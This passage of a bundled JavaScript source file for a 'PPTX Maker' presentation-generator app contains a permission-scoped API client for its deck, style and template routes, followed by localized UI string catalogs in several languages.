import { activeLocale, useAppApi, useChatLauncher, useImeGuard, useLanguageGeneration } from "@kirocrew/app-sdk";
import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
import { AlertTriangle, Copy, Download, ExternalLink, Layers, Loader2, MessageSquarePlus, Palette, Pencil, Pin, Plus, Presentation, Sparkles, Trash2, Type } from "lucide-react";
import * as ui from "@kirocrew/app-sdk/ui";
import { Btn, Card, CardTitle, Clickable, EmptyState, ErrorNotice, InfoTip, Input, MarkdownRenderer, PageHeader, SearchInput, SegmentedControl, SendBtn, StatCard } from "@kirocrew/app-sdk/ui";
import { Fragment, jsx, jsxs } from "react/jsx-runtime";
// src/api.ts
/**
* PPTX Maker — typed API client.
*
* The routes are served by the gateway's route registry under
* `/api/apps/pptx-maker` (`backend/routes.py`), the prefix `permissions.api`
* grants. Every request goes through the host's permission-scoped client
* (`useAppApi()`), which the page's root hands to `setTransport`: a same-origin
* fetch carrying the dashboard's session cookie, refused client-side for any path
* outside the manifest's grant. A non-2xx surfaces from that client as an error
* carrying the status and the raw body, which is read back here into
* `PptxMakerError` so the page sees the backend's own `error` text as before.
*
* Deck artifact URLs come back from the server as `preview/...` paths relative to
* this base, never as filesystem paths, so `artifactUrl()` is the only place they
* are turned into something fetchable.
*/
var API_BASE = "/api/apps/pptx-maker";
/** Before the root mounts (tests, or a module evaluated early): a plain fetch. */
var sameOriginFetch = { async raw(path, init) {
	const r = await fetch(path, {
		credentials: "same-origin",
		...init
	});
	if (!r.ok) {
		const text = await r.text().catch(() => r.statusText);
		throw Object.assign(/* @__PURE__ */ new Error(`API ${r.status}: ${text}`), {
			status: r.status,
			body: text
		});
	}
	return r;
} };
var transport = sameOriginFetch;
/** Route every call through *next* (the page root passes `useAppApi()`). */
function setTransport(next) {
	transport = next ?? sameOriginFetch;
}
var PptxMakerError = class extends Error {
	status;
	constructor(message, status) {
		super(message);
		this.name = "PptxMakerError";
		this.status = status;
	}
};
/**
* The scoped client's refusal as a `PptxMakerError`: the backend's own `error`
* text when the body is the JSON contract, else `HTTP <status>`. Anything that
* is not an HTTP refusal (a network failure, a path outside the grant refused
* in the browser) is re-thrown unchanged.
*/
function asPptxMakerError(err) {
	if (err && typeof err === "object" && typeof err.status === "number") {
		const status = err.status;
		const body = err.body;
		let message = `HTTP ${status}`;
		if (typeof body === "string") try {
			const parsed = JSON.parse(body);
			if (parsed && typeof parsed.error === "string") message = parsed.error;
		} catch {}
		throw new PptxMakerError(message, status);
	}
	throw err;
}
async function send(path, init) {
	try {
		return await transport.raw(path, init);
	} catch (err) {
		return asPptxMakerError(err);
	}
}
async function request(path, init) {
	const res = await send(`${API_BASE}${path}`, init);
	if (res.status === 204) return void 0;
	return await res.json();
}
function postJson(path, body) {
	return request(path, {
		method: "POST",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify(body)
	});
}
/**
* Turn a server-returned relative artifact path into a fetchable URL.
*
* The server never hands out absolute paths, so this is the single place a deck
* artifact reference becomes a request.
*/
function artifactUrl(relative) {
	return `${API_BASE}/${relative.replace(/^\/+/, "")}`;
}
/** Fetch a deck artifact as text (a spec document or a style board). */
async function fetchArtifactText(relative) {
	return (await send(artifactUrl(relative))).text();
}
/** Fetch a deck artifact as JSON (a compose payload or the shared defs). */
async function fetchArtifactJson(relative) {
	return await (await send(artifactUrl(relative))).json();
}
var pptxMakerApi = {
	engine: () => request("/engine"),
	provisionEngine: () => request("/engine/provision", { method: "POST" }),
	deps: () => request("/deps"),
	assets: () => request("/assets"),
	provisionAssets: (force = false) => request(`/assets/provision${force ? "?force=true" : ""}`, { method: "POST" }),
	config: () => request("/settings"),
	setDeckRoot: (deckRoot) => request("/settings", {
		method: "PUT",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify({ deckRoot })
	}),
	decks: () => request("/decks"),
	deck: (deckId) => request(`/deck?id=${encodeURIComponent(deckId)}`),
	styles: () => request("/styles"),
	style: (name) => request(`/style?name=${encodeURIComponent(name)}`),
	importStyle: (name, html) => request(`/styles/import?name=${encodeURIComponent(name)}`, {
		method: "POST",
		body: html
	}),
	renameStyle: (name, to) => postJson("/styles/rename", {
		name,
		to
	}),
	pinStyle: (name, pinned) => postJson("/styles/pin", {
		name,
		pinned
	}),
	deleteStyle: (name) => request(`/styles?name=${encodeURIComponent(name)}`, { method: "DELETE" }),
	templates: () => request("/templates"),
	importTemplate: (name, file, description = "") => request(`/templates/import?name=${encodeURIComponent(name)}&description=${encodeURIComponent(description)}`, {
		method: "POST",
		body: file
	}),
	renameTemplate: (name, to) => postJson("/templates/rename", {
		name,
		to
	}),
	deleteTemplate: (name) => request(`/templates?name=${encodeURIComponent(name)}`, { method: "DELETE" })
};
// src/i18n.ts
/**
* The app's own strings. A bundle cannot read the dashboard's catalogs (those
* belong to the host and change with it), so every locale the dashboard ships is
* bundled here and looked up against the host's active language.
*
* The catalogs (`ui/i18n/<locale>.json`) are the `apps.papyrus.*` subtree copied
* from Kiro Crew's dashboard catalogs, plus the handful of shared dashboard
* strings the page used (a resize grip's label, the confirm dialog's Cancel, the
* script names), under the SAME key paths, so every call site reads as it did in
* the built-in.
*
* Lookup order: the exact locale (`pt`, `zh-CN`), then its base language, then
* English, then the key itself. A numeric `count` selects the plural form the
* locale's rules name (`_one`, `_few`, `_many`, `_other`), as the dashboard's own
* catalogs are keyed. `{{name}}` placeholders are filled from `vars`; one with no
* value is left as written.
*
* `t` reads the language at call time. The root component subscribes to the
* host's language changes (`useLanguageGeneration`), and its re-render reaches
* every child, so a language switch repaints the page without a reload.
*/
var CATALOGS = {
	bn: { apps: /* @__PURE__ */ JSON.parse("{\"pptxMaker\":{\"boardFrame\":{\"loading\":\"প্রাকদর্শন লোড হচ্ছে…\",\"thumbnail\":\"শৈলীর থাম্বনেইল\"},\"deckViewer\":{\"copy_folder_path\":\"ফোল্ডারের পাথ কপি করুন\",\"deck_not_found\":\"উপস্থাপনা পাওয়া যায়নি\",\"download_pptx\":\".pptx ডাউনলোড করুন\",\"folder_path_copied\":\"ফোল্ডারের পাথ কপি হয়েছে\",\"loading\":\"লোড হচ্ছে…\",\"no_slides_yet\":\"এখনও কোনও স্লাইড নেই\",\"slides_appear_as_the_agent_composes_them\":\"এজেন্ট স্লাইড সাজানোর সঙ্গে সঙ্গে সেগুলি এখানে দেখা যাবে।\",\"tab_art_direction\":\"শিল্প নির্দেশনা\",\"tab_brief\":\"সংক্ষিপ্তসার\",\"tab_outline\":\"রূপরেখা\",\"tab_slides\":\"স্লাইড\",\"unavailable\":\"এই ফলাফলটি পড়া গেল না।\"},\"libraryPanel\":{\"accepts_html\":\".html শৈলী নথি নেয়\",\"accepts_pptx\":\".pptx ফাইল নেয়\",\"built_in\":\"সঙ্গে আসা\",\"cancel\":\"বাতিল করুন\",\"delete\":\"মুছুন\",\"font_specimen\":\"Aa\",\"fonts\":\"হরফ: {{fonts}}\",\"import_style\":\"শৈলী আমদানি করুন\",\"import_template\":\"টেমপ্লেট আমদানি করুন\",\"layouts_one\":\"{{count}}টি বিন্যাস\",\"layouts_other\":\"{{count}}টি বিন্যাস\",\"loading\":\"লোড হচ্ছে…\",\"mine\":\"আপনার\",\"new_name\":\"নতুন নাম\",\"no_styles_yet\":\"এখনও কোনও শৈলী নেই\",\"no_templates_yet\":\"এখনও কোনও টেমপ্লেট নেই\",\"pin_style\":\"এই শৈলীটি পিন করুন\",\"pinned\":\"পিন করা\",\"reference_in_chat\":\"চ্যাটে এভাবে উল্লেখ করুন:\",\"rename\":\"নাম বদলান\",\"save\":\"সংরক্ষণ করুন\",\"select_a_style\":\"প্রাকদর্শনের জন্য একটি শৈলী বেছে নিন।\",\"select_a_template\":\"প্রাকদর্শনের জন্য একটি টেমপ্লেট বেছে নিন।\",\"style_preview\":\"শৈলীর প্রাকদর্শন\",\"styles\":\"শৈলী\",\"styles_tip\":\"শৈলী দৃশ্যগত মেজাজ ঠিক করে — রং, হরফ আর বিন্যাসের অনুভব। স্লাইড সাজানোর সময় এজেন্ট সেটিই মানে।\",\"templates\":\"টেমপ্লেট\",\"templates_tip\":\"টেমপ্লেট হল একটি .pptx স্লাইড মাস্টার। এটি থিমের রং, হরফ আর উপলব্ধ বিন্যাস ঠিক করে।\",\"unpin_style\":\"এই শৈলীটি আনপিন করুন\"},\"manifest\":{\"description\":\"চ্যাটে কেমন উপস্থাপনা চাও বলে দাও, আর সত্যিকারের একটি .pptx ফিরে পাও। একটি এজেন্ট তোমাকে কিছু প্রশ্ন করে, একটি সংক্ষিপ্তসার, একটি রূপরেখা ও একটি শিল্প নির্দেশনা লেখে, তারপর প্রতিটি স্লাইড সাজিয়ে ফাইলটি তৈরি করে — আর আলাপের পাশেই লাইভ প্রিভিউতে প্রতিটি ধাপের ফল তুমি দেখতে পাও। স্লাইডগুলো তৈরি হওয়ার সঙ্গে সঙ্গে অ্যানিমেটেড SVG হিসেবে দেখা যায়, তাই ডাউনলোডের অপেক্ষা না করেই উপস্থাপনাটা গড়ে উঠতে দেখা যায়। বারবার ব্যবহারযোগ্য শৈলী আর .pptx টেমপ্লেট দিয়ে একই লেখা তিনটি আলাদা উপস্থাপনার মতো দেখাতে পারে।\",\"display_name\":\"PPTX Maker\",\"use_case_1\":\"কোনো idea, URL বা source text-কে live slide preview ও পুনর্ব্যবহারযোগ্য visual style-সহ সত্যিকারের presentation-এ বদলান।\",\"configuration_1\":\"প্রথম ব্যবহারে pinned engine install করুন, আরও preview-এর জন্য চাইলে LibreOffice install করুন, output directory বেছে নিন এবং পুনর্ব্যবহারের জন্য HTML style বা PPTX template import করুন।\",\"highlight_1\":\"চ্যাট করেই একটি তৈরি .pptx পর্যন্ত পৌঁছাও — নির্দিষ্টকরণ মোড যত্ন করে পরিকল্পনা করে, চটজলদি মোড কোনো URL বা পেস্ট করা লেখা সোজা স্লাইডে বদলে দেয়\",\"highlight_2\":\"প্রতিটি ধাপের ফলের লাইভ প্রিভিউ: সংক্ষিপ্তসার, রূপরেখা, শিল্প নির্দেশনা, তারপর সাজানোর সময়েই অ্যানিমেটেড SVG হিসেবে স্লাইড\",\"highlight_3\":\"শৈলী চেহারার মেজাজ ঠিক করে আর .pptx টেমপ্লেট গড়ন ঠিক করে, তাই লেখা নতুন করে না লিখেই একটি উপস্থাপনার সাজ বদলে ফেলা যায়\",\"highlight_4\":\"নিজের HTML শৈলী বা আগে থেকে থাকা কোনো .pptx টেমপ্লেট আমদানি করো, আর এজেন্ট তার রং, ফন্ট ও লেআউট মেনে চলবে\",\"highlight_5\":\"ড্যাশবোর্ড ছেড়ে না গিয়েই তৈরি ফাইলটি খোলো বা তার ফোল্ডার দেখে নাও\",\"highlight_6\":\"প্রকাশ্য spec-driven-presentation-maker ইঞ্জিনটিকে মুড়ে রাখে, sha256-পিন করা ভার্সনে নামানো হয়; হাতে কিছু ইনস্টল করার নেই\",\"page_label\":\"PPTX Maker\"},\"pptxMakerPage\":{\"deck_output_directory\":\"উপস্থাপনার আউটপুট ফোল্ডার\",\"deck_output_directory_tip\":\"তৈরি হওয়া উপস্থাপনা কোথায় লেখা হয়। এজেন্ট এই ফোল্ডারেই উপস্থাপনা পড়ে ও লেখে।\",\"decks\":\"উপস্থাপনা\",\"decks_tip\":\"আউটপুট ফোল্ডারে ইঞ্জিন যে উপস্থাপনাগুলি বানিয়েছে, সবই এখানে। একটি বেছে নিয়ে তার ফলাফল দেখুন।\",\"engine_install_failed\":\"উপস্থাপনা ইঞ্জিন ইনস্টল করা গেল না।\",\"engine_installing\":\"উপস্থাপনা ইঞ্জিন ইনস্টল হচ্ছে… {{seconds}} সেকেন্ড\",\"engine_not_installed\":\"উপস্থাপনা ইঞ্জিন এখনও ইনস্টল করা হয়নি।\",\"engine_requirements\":\"ইঞ্জিনের যাচাই-করা কপি ডাউনলোড করে — কিছু ইনস্টল করার দরকার নেই। {{tag}}-এ নির্দিষ্ট করা।\",\"icon_packs_failed\":\"আইকন প্যাকগুলো ইনস্টল করা যায়নি।\",\"icon_packs_hint\":\"স্লাইড বানাতে এজেন্টের এগুলো দরকার। ইঞ্জিনের দুটি বিনামূল্যের আইকন সেট ডাউনলোড করে (প্রায় 40 MB)।\",\"icon_packs_installing\":\"আইকন প্যাক ইনস্টল হচ্ছে… {{seconds}} সে\",\"icon_packs_missing\":\"আইকন প্যাকগুলো এখনও ইনস্টল করা হয়নি।\",\"install_engine\":\"ইঞ্জিন ইনস্টল করুন\",\"install_icon_packs\":\"আইকন প্যাক ইনস্টল করুন\",\"loading\":\"লোড হচ্ছে…\",\"mode_spec\":\"নির্দিষ্টকরণ মোড\",\"mode_spec_hint\":\"প্রথমে আলাপ, তারপর সংক্ষিপ্তসার, রূপরেখা আর শিল্প নির্দেশনা — স্লাইড সবার শেষে।\",\"mode_style\":\"শৈলী নির্মাতা\",\"mode_style_hint\":\"এমন একটি শৈলী গড়ুন যা পরের যেকোনও উপস্থাপনায় কাজে লাগবে।\",\"mode_vibe\":\"চটজলদি মোড\",\"mode_vibe_hint\":\"একটি URL বা কিছু লেখা পেস্ট করুন, সঙ্গে সঙ্গেই স্লাইড পান।\",\"no_decks_yet\":\"এখনও কোনও উপস্থাপনা নেই\",\"no_decks_yet_hint\":\"উপরে একটি শুরু করুন, এজেন্ট সেটি এখানে লিখে দেবে।\",\"no_matching_decks\":\"এই খোঁজের সঙ্গে কোনও উপস্থাপনা মেলে না\",\"optional_deps_missing\":\"{{labels}} ইনস্টল করা নেই, তাই স্লাইড থাম্বনেইল আর PDF প্রাকদর্শন পাওয়া যাবে না।\",\"optional_deps_missing_with_hint\":\"{{labels}} ইনস্টল করা নেই, তাই স্লাইড থাম্বনেইল আর PDF প্রাকদর্শন পাওয়া যাবে না। এটি ইনস্টল করুন: {{command}}\",\"reset\":\"আগের মতো করুন\",\"retry_install\":\"ইনস্টল আবার চেষ্টা করুন\",\"save\":\"সংরক্ষণ করুন\",\"saved\":\"সংরক্ষিত হয়েছে।\",\"search_decks\":\"উপস্থাপনা খুঁজুন…\",\"select_a_deck\":\"খুলতে একটি উপস্থাপনা বেছে নিন।\",\"slide_count_one\":\"{{count}}টি স্লাইড\",\"slide_count_other\":\"{{count}}টি স্লাইড\",\"start_a_deck\":\"উপস্থাপনা শুরু করুন\",\"start_a_deck_tip\":\"উপস্থাপনা চ্যাটেই তৈরি হয়। একটি মোড বেছে নিন, অ্যাপ সেটি চালানো এজেন্টের সঙ্গে একটি সেশন খুলে দেবে।\",\"stat_decks\":\"উপস্থাপনা\",\"stat_finished\":\"তৈরি ফাইল\",\"stat_slides\":\"স্লাইড\",\"stat_styles\":\"শৈলী\",\"stat_templates\":\"টেমপ্লেট\",\"subtitle\":\"চ্যাটে একটি উপস্থাপনার বর্ণনা দিন, দেখুন সেটি সত্যিকারের .pptx হয়ে উঠছে\",\"title\":\"PPTX Maker\",\"view_decks\":\"উপস্থাপনা\",\"view_library\":\"লাইব্রেরি\",\"view_settings\":\"সেটিংস\",\"view_styles\":\"শৈলী\",\"view_templates\":\"টেমপ্লেট\"},\"slidePreview\":{\"preview_unavailable\":\"প্রাকদর্শন পাওয়া যাচ্ছে না\"}}}") },
	de: { apps: { "pptxMaker": {
		"boardFrame": {
			"loading": "Vorschau wird geladen…",
			"thumbnail": "Stil-Miniaturansicht"
		},
		"deckViewer": {
			"copy_folder_path": "Ordnerpfad kopieren",
			"deck_not_found": "Präsentation nicht gefunden",
			"download_pptx": ".pptx herunterladen",
			"folder_path_copied": "Ordnerpfad kopiert",
			"loading": "Wird geladen…",
			"no_slides_yet": "Noch keine Folien",
			"slides_appear_as_the_agent_composes_them": "Folien erscheinen hier, sobald der Agent sie setzt.",
			"tab_art_direction": "Art-Direction",
			"tab_brief": "Briefing",
			"tab_outline": "Gliederung",
			"tab_slides": "Folien",
			"unavailable": "Dieses Ergebnis konnte nicht gelesen werden."
		},
		"libraryPanel": {
			"accepts_html": "Nimmt ein .html-Stildokument an",
			"accepts_pptx": "Nimmt eine .pptx-Datei an",
			"built_in": "Mitgeliefert",
			"cancel": "Abbrechen",
			"delete": "Löschen",
			"font_specimen": "Aa",
			"fonts": "Schriften: {{fonts}}",
			"import_style": "Stil importieren",
			"import_template": "Vorlage importieren",
			"layouts_one": "{{count}} Layout",
			"layouts_other": "{{count}} Layouts",
			"loading": "Wird geladen…",
			"mine": "Eigene",
			"new_name": "Neuer Name",
			"no_styles_yet": "Noch keine Stile",
			"no_templates_yet": "Noch keine Vorlagen",
			"pin_style": "Diesen Stil anpinnen",
			"pinned": "Angepinnt",
			"reference_in_chat": "Im Chat so ansprechen:",
			"rename": "Umbenennen",
			"save": "Speichern",
			"select_a_style": "Wähle einen Stil für die Vorschau.",
			"select_a_template": "Wähle eine Vorlage für die Vorschau.",
			"style_preview": "Stilvorschau",
			"styles": "Stile",
			"styles_tip": "Ein Stil ist die visuelle Stimmung — Farben, Typografie und Layout-Gefühl. Der Agent folgt ihm beim Setzen der Folien.",
			"templates": "Vorlagen",
			"templates_tip": "Eine Vorlage ist eine .pptx-Datei, deren Folienlayouts die Themenfarben, die Schriften und die verfügbaren Layouts festlegen.",
			"unpin_style": "Diesen Stil losmachen"
		},
		"manifest": {
			"description": "Beschreibe im Chat die Präsentation, die du willst, und erhalte eine echte .pptx zurück. Ein Agent befragt dich, schreibt Briefing, Gliederung und Art-Direction, setzt dann jede Folie und erzeugt die Datei — und du siehst jedes Ergebnis in einer Live-Vorschau neben dem Gespräch erscheinen. Folien werden beim Bauen als animiertes SVG dargestellt, sodass du eine Präsentation entstehen siehst, statt auf einen Download zu warten. Wiederverwendbare Stile und .pptx-Vorlagen lassen denselben Inhalt wie drei verschiedene Präsentationen aussehen.",
			"display_name": "PPTX Maker",
			"highlight_1": "Chatte dich zu einer fertigen .pptx — der Spec-Modus plant sorgfältig, der Vibe-Modus macht aus einer URL oder eingefügtem Text direkt Folien",
			"highlight_2": "Live-Vorschau jedes Ergebnisses: Briefing, Gliederung, Art-Direction, dann Folien als animiertes SVG, während sie entstehen",
			"highlight_3": "Stile bestimmen die visuelle Stimmung, .pptx-Vorlagen die Struktur, sodass eine Präsentation ein neues Aussehen erhalten kann, ohne Inhalte neu zu schreiben",
			"highlight_4": "Importiere ein eigenes HTML-Stildokument oder eine bestehende .pptx-Vorlage, und der Agent folgt deren Farben, Schriften und Layouts",
			"highlight_5": "Öffne die fertige Datei oder zeige ihren Ordner an, ohne das Dashboard zu verlassen",
			"highlight_6": "Kapselt die öffentliche Engine spec-driven-presentation-maker, die in einer per sha256 festgelegten Version geladen wird; nichts von Hand zu installieren",
			"page_label": "PPTX Maker",
			"use_case_1": "Verwandle eine Idee, URL oder einen Ausgangstext in eine echte Präsentation mit Live-Folienvorschau und wiederverwendbaren visuellen Stilen.",
			"configuration_1": "Installiere bei der ersten Verwendung die fixierte Engine, optional LibreOffice für umfassendere Vorschauen, wähle ein Ausgabeverzeichnis und importiere wiederzuverwendende HTML-Stile oder PPTX-Vorlagen."
		},
		"pptxMakerPage": {
			"deck_output_directory": "Ausgabeordner für Präsentationen",
			"deck_output_directory_tip": "Wohin fertige Präsentationen geschrieben werden. Der Agent liest und schreibt Präsentationen in diesem Ordner.",
			"decks": "Präsentationen",
			"decks_tip": "Jede Präsentation, die die Engine im Ausgabeordner erzeugt hat. Wähle eine, um ihre Ergebnisse zu verfolgen.",
			"engine_install_failed": "Die Präsentations-Engine konnte nicht installiert werden.",
			"engine_installing": "Präsentations-Engine wird installiert… {{seconds}}s",
			"engine_not_installed": "Die Präsentations-Engine ist noch nicht installiert.",
			"engine_requirements": "Lädt eine geprüfte Kopie der Engine herunter — nichts zu installieren. Festgelegt auf {{tag}}.",
			"icon_packs_failed": "Die Icon-Pakete konnten nicht installiert werden.",
			"icon_packs_hint": "Der Agent braucht sie, um Folien zu gestalten. Lädt die zwei freien Icon-Sets der Engine herunter (etwa 40 MB).",
			"icon_packs_installing": "Icon-Pakete werden installiert… {{seconds}} s",
			"icon_packs_missing": "Die Icon-Pakete sind noch nicht installiert.",
			"install_engine": "Engine installieren",
			"install_icon_packs": "Icon-Pakete installieren",
			"loading": "Wird geladen…",
			"mode_spec": "Spec-Modus",
			"mode_spec_hint": "Erst ein Gespräch, dann Briefing, Gliederung und Art-Direction, bevor eine Folie entsteht.",
			"mode_style": "Stil-Werkstatt",
			"mode_style_hint": "Baue einen wiederverwendbaren Stil, den du auf jede spätere Präsentation anwenden kannst.",
			"mode_vibe": "Vibe-Modus",
			"mode_vibe_hint": "Füge eine URL oder etwas Text ein und erhalte direkt Folien.",
			"no_decks_yet": "Noch keine Präsentationen",
			"no_decks_yet_hint": "Starte oben eine und der Agent schreibt sie hierher.",
			"no_matching_decks": "Keine Präsentation passt zu dieser Suche",
			"optional_deps_missing": "{{labels}} ist nicht installiert, daher sind Folien-Miniaturansichten und die PDF-Vorschau nicht verfügbar.",
			"optional_deps_missing_with_hint": "{{labels}} ist nicht installiert, daher sind Folien-Miniaturansichten und die PDF-Vorschau nicht verfügbar. Installieren Sie es mit: {{command}}",
			"reset": "Zurücksetzen",
			"retry_install": "Installation erneut versuchen",
			"save": "Speichern",
			"saved": "Gespeichert.",
			"search_decks": "Präsentationen suchen…",
			"select_a_deck": "Wähle eine Präsentation, um sie zu öffnen.",
			"slide_count_one": "{{count}} Folie",
			"slide_count_other": "{{count}} Folien",
			"start_a_deck": "Präsentation beginnen",
			"start_a_deck_tip": "Präsentationen entstehen im Chat. Wähle einen Modus, und die App öffnet eine Sitzung mit dem passenden Agenten.",
			"stat_decks": "Präsentationen",
			"stat_finished": "Fertige Dateien",
			"stat_slides": "Folien",
			"stat_styles": "Stile",
			"stat_templates": "Vorlagen",
			"subtitle": "Beschreibe im Chat eine Präsentation und sieh zu, wie eine echte .pptx daraus wird",
			"title": "PPTX Maker",
			"view_decks": "Präsentationen",
			"view_library": "Bibliothek",
			"view_settings": "Einstellungen",
			"view_styles": "Stile",
			"view_templates": "Vorlagen"
		},
		"slidePreview": { "preview_unavailable": "Keine Vorschau verfügbar" }
	} } },
	en: { apps: { "pptxMaker": {
		"boardFrame": {
			"loading": "Loading the preview…",
			"thumbnail": "Style thumbnail"
		},
		"deckViewer": {
			"copy_folder_path": "Copy folder path",
			"deck_not_found": "Deck not found",
			"download_pptx": "Download .pptx",
			"folder_path_copied": "Folder path copied",
			"loading": "Loading…",
			"no_slides_yet": "No slides yet",
			"slides_appear_as_the_agent_composes_them": "Slides appear here as the agent composes them.",
			"tab_art_direction": "Art direction",
			"tab_brief": "Brief",
			"tab_outline": "Outline",
			"tab_slides": "Slides",
			"unavailable": "This deliverable could not be read."
		},
		"libraryPanel": {
			"accepts_html": "Accepts an .html style document",
			"accepts_pptx": "Accepts a .pptx file",
			"built_in": "Bundled",
			"cancel": "Cancel",
			"delete": "Delete",
			"fonts": "Fonts: {{fonts}}",
			"import_style": "Import a style",
			"import_template": "Import a template",
			"layouts_one": "{{count}} layout",
			"layouts_other": "{{count}} layouts",
			"loading": "Loading…",
			"mine": "Yours",
			"new_name": "New name",
			"no_styles_yet": "No styles yet",
			"no_templates_yet": "No templates yet",
			"pin_style": "Pin this style",
			"pinned": "Pinned",
			"reference_in_chat": "Reference it in chat as",
			"rename": "Rename",
			"save": "Save",
			"select_a_style": "Pick a style to preview it.",
			"select_a_template": "Pick a template to preview it.",
			"style_preview": "Style preview",
			"styles": "Styles",
			"styles_tip": "A style is the visual mood — colours, type, and layout feel. The agent follows it when composing slides.",
			"templates": "Templates",
			"templates_tip": "A template is a .pptx whose slide layouts set the theme colours, the fonts, and the layouts available.",
			"unpin_style": "Unpin this style",
			"font_specimen": "Aa"
		},
		"manifest": {
			"description": "Describe the deck you want in chat and get a real .pptx back. An agent interviews you, writes a brief, an outline and an art direction, then composes every slide and generates the file — and you watch each deliverable appear in a live preview beside the conversation. Slides render as animated SVG as they are built, so you can see a deck take shape instead of waiting for a download. Reusable styles and .pptx templates let the same content come out looking like three different presentations.",
			"display_name": "PPTX Maker",
			"highlight_1": "Chat your way to a finished .pptx — Spec mode plans it carefully, Vibe mode turns a URL or pasted text straight into slides",
			"highlight_2": "Live preview of every deliverable: brief, outline, art direction, then slides as animated SVG while they compose",
			"highlight_3": "Styles set the visual mood and .pptx templates set the structure, so one deck can be re-skinned without rewriting content",
			"highlight_4": "Import your own HTML style or existing .pptx template and the agent follows its colours, fonts and layouts",
			"highlight_5": "Open the finished file or reveal its folder without leaving the dashboard",
			"highlight_6": "Wraps the public spec-driven-presentation-maker engine, fetched at a sha256-pinned version; nothing to install by hand",
			"page_label": "PPTX Maker",
			"use_case_1": "Turn an idea, URL, or source text into a real presentation with live slide previews and reusable visual styles.",
			"configuration_1": "Install the pinned engine on first use, optionally install LibreOffice for broader previews, choose an output directory, and import any HTML styles or PPTX templates you want reused."
		},
		"pptxMakerPage": {
			"deck_output_directory": "Deck output directory",
			"deck_output_directory_tip": "Where finished decks are written. The agent reads and writes decks under this folder.",
			"decks": "Decks",
			"decks_tip": "Every deck the engine has produced under the output directory. Pick one to watch its deliverables.",
			"engine_install_failed": "The presentation engine could not be installed.",
			"engine_installing": "Installing the presentation engine… {{seconds}}s",
			"engine_not_installed": "The presentation engine is not installed yet.",
			"engine_requirements": "Downloads a verified copy of the engine — nothing to install. Pinned to {{tag}}.",
			"icon_packs_failed": "The icon packs could not be installed.",
			"icon_packs_hint": "The agent needs them to compose slides. Downloads the engine's two free icon sets (about 40 MB).",
			"icon_packs_installing": "Installing the icon packs… {{seconds}}s",
			"icon_packs_missing": "The icon packs are not installed yet.",
			"install_engine": "Install engine",
			"install_icon_packs": "Install icon packs",
			"loading": "Loading…",
			"mode_spec": "Spec mode",
			"mode_spec_hint": "An interview first, then a brief, an outline, and an art direction before any slide.",
			"mode_style": "Style creator",
			"mode_style_hint": "Build a reusable visual style you can apply to any later deck.",
			"mode_vibe": "Vibe mode",
			"mode_vibe_hint": "Paste a URL or some text and get slides straight away.",
			"no_decks_yet": "No decks yet",
			"no_decks_yet_hint": "Start one above and the agent will write it here.",
			"no_matching_decks": "No deck matches that search",
			"optional_deps_missing": "{{labels}} is not installed, so slide thumbnails and PDF preview are unavailable.",
			"optional_deps_missing_with_hint": "{{labels}} is not installed, so slide thumbnails and PDF preview are unavailable. Install it with: {{command}}",
			"reset": "Reset",
			"retry_install": "Try the install again",
			"save": "Save",
			"saved": "Saved.",
			"search_decks": "Search decks…",
			"select_a_deck": "Pick a deck to open it.",
			"slide_count_one": "{{count}} slide",
			"slide_count_other": "{{count}} slides",
			"start_a_deck": "Start a deck",
			"start_a_deck_tip": "Deck generation happens in chat. Pick a mode and the app opens a session on the agent that runs it.",
			"stat_decks": "Decks",
			"stat_finished": "Finished files",
			"stat_slides": "Slides",
			"stat_styles": "Styles",
			"stat_templates": "Templates",
			"subtitle": "Describe a deck in chat and watch it become a real .pptx",
			"title": "PPTX Maker",
			"view_decks": "Decks",
			"view_library": "Library",
			"view_settings": "Settings",
			"view_styles": "Styles",
			"view_templates": "Templates"
		},
		"slidePreview": { "preview_unavailable": "Preview unavailable" }
	} } },
	es: { apps: { "pptxMaker": {
		"boardFrame": {
			"loading": "Cargando la vista previa…",
			"thumbnail": "Miniatura del estilo"
		},
		"deckViewer": {
			"copy_folder_path": "Copiar la ruta de la carpeta",
			"deck_not_found": "Presentación no encontrada",
			"download_pptx": "Descargar el .pptx",
			"folder_path_copied": "Ruta de la carpeta copiada",
			"loading": "Cargando…",
			"no_slides_yet": "Aún no hay diapositivas",
			"slides_appear_as_the_agent_composes_them": "Las diapositivas aparecen aquí a medida que el agente las compone.",
			"tab_art_direction": "Dirección de arte",
			"tab_brief": "Briefing",
			"tab_outline": "Esquema",
			"tab_slides": "Diapositivas",
			"unavailable": "No se pudo leer este resultado."
		},
		"libraryPanel": {
			"accepts_html": "Acepta un documento de estilo .html",
			"accepts_pptx": "Acepta un archivo .pptx",
			"built_in": "Incluidos",
			"cancel": "Cancelar",
			"delete": "Eliminar",
			"font_specimen": "Aa",
			"fonts": "Fuentes: {{fonts}}",
			"import_style": "Importar un estilo",
			"import_template": "Importar una plantilla",
			"layouts_many": "{{count}} composiciones",
			"layouts_one": "{{count}} composición",
			"layouts_other": "{{count}} composiciones",
			"loading": "Cargando…",
			"mine": "Tuyos",
			"new_name": "Nombre nuevo",
			"no_styles_yet": "Aún no hay estilos",
			"no_templates_yet": "Aún no hay plantillas",
			"pin_style": "Fijar este estilo",
			"pinned": "Fijado",
			"reference_in_chat": "Menciónalo en el chat así:",
			"rename": "Cambiar el nombre",
			"save": "Guardar",
			"select_a_style": "Elige un estilo para verlo.",
			"select_a_template": "Elige una plantilla para verla.",
			"style_preview": "Vista previa del estilo",
			"styles": "Estilos",
			"styles_tip": "Un estilo es el aire visual: colores, tipografía y sensación de composición. El agente lo sigue al componer las diapositivas.",
			"templates": "Plantillas",
			"templates_tip": "Una plantilla es un patrón de diapositivas .pptx. Fija los colores del tema, las tipografías y las composiciones disponibles.",
			"unpin_style": "Dejar de fijar este estilo"
		},
		"manifest": {
			"description": "Describe en el chat la presentación que quieres y recibe un .pptx real. Un agente te entrevista, escribe un briefing, un esquema y una dirección de arte, luego compone cada diapositiva y genera el archivo — y tú ves aparecer cada entregable en una vista previa en vivo junto a la conversación. Las diapositivas se renderizan como SVG animado mientras se construyen, así que puedes ver cómo toma forma la presentación en lugar de esperar una descarga. Los estilos reutilizables y las plantillas .pptx permiten que el mismo contenido salga con el aspecto de tres presentaciones distintas.",
			"display_name": "PPTX Maker",
			"highlight_1": "Llega a un .pptx terminado conversando — el modo especificación lo planea con cuidado y el modo directo convierte una URL o un texto pegado directamente en diapositivas",
